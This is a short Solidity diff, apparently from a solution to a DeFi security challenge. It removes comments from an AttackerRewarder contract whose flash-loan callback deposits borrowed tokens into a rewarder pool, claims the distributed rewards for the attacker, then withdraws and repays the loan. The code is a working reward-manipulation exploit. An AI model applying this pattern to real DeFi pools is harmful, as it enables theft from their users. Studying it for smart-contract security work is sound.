@@ -34,18 +34,12 @@ contract AttackerRewarder is IFlashLoanReceiver {
     }
 
     function receiveFlashLoan(uint256 amount) external override {
-        // approve all of the tokens and deposit them
         liquidityToken.approve(address(rewarderPool), amount);
         rewarderPool.deposit(amount);
 
-        // attacker steal the token
         uint256 rewards = rewarderPool.distributeRewards();
         rewardToken.transfer(attacker, rewards);
-
-        // withdraw amount
         rewarderPool.withdraw(amount);
-
-        // pay back
         liquidityToken.transfer(address(flashLoanerPool), amount);
     }
 
